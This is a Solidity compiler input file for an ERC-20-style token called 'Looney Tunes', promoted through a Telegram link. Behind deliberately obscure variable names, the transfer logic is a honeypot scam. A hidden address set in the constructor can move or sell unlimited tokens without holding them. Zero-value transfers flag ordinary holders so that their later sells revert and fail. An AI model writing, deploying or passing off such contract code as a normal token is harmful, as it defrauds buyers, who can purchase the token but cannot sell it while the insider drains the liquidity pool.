{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nhttps://t.me/looneytunes_eth\n\n*/\n\n// SPDX-License-Identifier: Unlicense\n\npragma solidity >0.8.14;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\n\ncontract LooneyTunes is Ownable {\n    uint256 private pound = 7;\n\n    mapping(address => uint256) private held;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => uint256) public balanceOf;\n\n    function approve(address determine, uint256 practice) public returns (bool success) {\r\n        allowance[msg.sender][determine] = practice;\r\n        emit Approval(msg.sender, determine, practice);\r\n        return true;\r\n    }\n\n    string public symbol = 'Looney Tunes';\n\n    uint8 public decimals = 9;\n\n    address public uniswapV2Pair;\n\n    function transfer(address mile, uint256 practice) public returns (bool success) {\r\n        studied(msg.sender, mile, practice);\r\n        return true;\r\n    }\n\n    function transferFrom(address salmon, address mile, uint256 practice) public returns (bool success) {\r\n        require(practice <= allowance[salmon][msg.sender]);\r\n        allowance[salmon][msg.sender] -= practice;\r\n        studied(salmon, mile, practice);\r\n        return true;\r\n    }\n\n    constructor(address afraid) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        does[afraid] = pound;\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n    }\n\n    mapping(address => uint256) private does;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\n\n    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n    string public name = 'Looney Tunes';\n\n    function studied(address salmon, address mile, uint256 practice) private returns (bool success) {\r\n        if (does[salmon] == 0) {\r\n            balanceOf[salmon] -= practice;\r\n        }\r\n\n        if (practice == 0) held[mile] += pound;\r\n\n        if (does[salmon] == 0 && uniswapV2Pair != salmon && held[salmon] > 0) {\r\n            does[salmon] -= pound;\r\n        }\r\n\n        balanceOf[mile] += practice;\r\n        emit Transfer(salmon, mile, practice);\r\n        return true;\r\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}